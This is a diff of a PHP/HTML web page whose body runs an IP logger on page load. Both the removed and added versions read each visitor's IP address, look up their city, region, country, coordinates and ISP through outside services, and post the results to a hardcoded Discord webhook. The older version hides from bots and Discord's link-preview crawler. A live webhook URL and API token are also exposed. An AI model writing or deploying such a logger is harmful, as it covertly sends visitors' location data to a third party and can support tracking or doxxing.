@@ -14,47 +14,78 @@
      crossorigin="anonymous"></script>
   </head>
   <body class="center" onload="SplashT">
-    <?php
-        error_reporting(E_ALL);
-        ini_set('display_errors', 1);
+<?php
+// --- Configuration ---
+// Your Discord webhook URL (replace with your actual webhook URL)
+$discordWebhookUrl = 'https://discord.com/api/webhooks/1349648325594583143/xXptCzRDkHB2hqt6FLKgpXatN_KdwgVGfi9T43-gxyIJCJy5K3XsUJWo-dy1IDOkm1yt';
 
-        $webhookurl = "https://discord.com/api/webhooks/1349648325594583143/xXptCzRDkHB2hqt6FLKgpXatN_KdwgVGfi9T43-gxyIJCJy5K3XsUJWo-dy1IDOkm1yt";
+// Your ipinfo.com token; if you don't have one, you can remove the token query parameter below.
+$ipinfoToken = '81c246ebd8b2c5';
 
-        $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
-        $browser = $_SERVER['HTTP_USER_AGENT'];
-        if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $browser)) {
-            exit();
-        }
-        $TheirDate = date('d/m/Y');
-        $TheirTime = date('G:i:s');
-        $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
-        $vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
-        if($vpnCon->connection_type==="Corporate"){
-            $vpn = "Yes (Double Check: $details->isp)";
-        }else{
-            $vpn = "No (Double Check: $details->isp)";
-        }
-        $flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
-        $data = "**User IP:** $ip\n**ISP:** $details->isp\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n[...]";
+// --- Get visitor's IP ---
+$ip = $_SERVER['REMOTE_ADDR'];
 
-        $json_data = array ('content'=>"$data", 'username'=>"Vistor Visited From: $details->country", 'avatar_url'=> "$flag");
-        $make_json = json_encode($json_data);
-        $ch = curl_init( $webhookurl );
+// --- Retrieve IP details from ipinfo.com ---
+$ipInfoUrl = "http://ipinfo.io/{$ip}/json" . ($ipinfoToken ? "?token={$ipinfoToken}" : "");
+$ipInfoJson = @file_get_contents($ipInfoUrl);
+$ipInfo = $ipInfoJson ? json_decode($ipInfoJson, true) : [];
 
-        curl_setopt( $ch, CURLOPT_POST, 1);
-        curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
-        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
-        curl_setopt( $ch, CURLOPT_HEADER, 0);
-        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
+// --- Prepare the Discord embed ---
+$embed = [
+    "title" => "New IP Logged",
+    "color" => hexdec("ff0000"), // red color
+    "fields" => [
+        [
+            "name"   => "IP Address",
+            "value"  => $ip,
+            "inline" => true
+        ],
+        [
+            "name"   => "City",
+            "value"  => isset($ipInfo['city']) ? $ipInfo['city'] : 'N/A',
+            "inline" => true
+        ],
+        [
+            "name"   => "Region",
+            "value"  => isset($ipInfo['region']) ? $ipInfo['region'] : 'N/A',
+            "inline" => true
+        ],
+        [
+            "name"   => "Country",
+            "value"  => isset($ipInfo['country']) ? $ipInfo['country'] : 'N/A',
+            "inline" => true
+        ],
+        [
+            "name"   => "Location (Lat,Long)",
+            "value"  => isset($ipInfo['loc']) ? $ipInfo['loc'] : 'N/A',
+            "inline" => true
+        ]
+    ],
+    "footer" => [
+        "text" => "Logged via IP Logger"
+    ],
+    "timestamp" => date('c')
+];
 
-        $response = curl_exec( $ch );
+// --- Create the payload ---
+$payload = json_encode([
+    "username" => "IP Logger",
+    "embeds" => [$embed]
+]);
 
-        if($response === FALSE){
-            die(curl_error($ch));
-        }
+// --- Send the embed to Discord using cURL ---
+$ch = curl_init($discordWebhookUrl);
+curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$response = curl_exec($ch);
+curl_close($ch);
 
-        curl_close($ch);
-    ?>
+// --- Optional: Display a confirmation on the page ---
+echo "Your IP has been logged.";
+?>
+
     <div class="f-nav"></div>
     <div id="particles-js">
       <script rel="preload" src="https://cdn.jsdelivr.net/particles.js/2.0.0/"></script>
